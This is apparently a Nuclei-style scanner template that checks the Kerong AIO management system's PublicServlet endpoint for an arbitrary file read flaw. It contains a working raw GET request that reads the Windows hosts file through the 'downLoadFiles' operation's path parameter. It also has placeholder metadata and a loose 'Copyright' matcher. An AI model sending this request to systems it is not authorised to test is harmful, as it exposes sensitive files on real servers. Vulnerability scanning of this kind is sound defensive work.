id: ketongAIO-PublicServlet-readfile
info:
  name: Template Name
  author: apple
  severity: high
  description: 科荣 AIO 管理系统PublicServlet接口处存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞读取敏感文件，造成信息泄露。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        GET /PublicServlet?operation=downLoadFiles&path=C:/Windows/System32/drivers/etc/hosts&pho= HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
    matchers:
      - type: word
        part: body
        words:
          - 'Copyright'
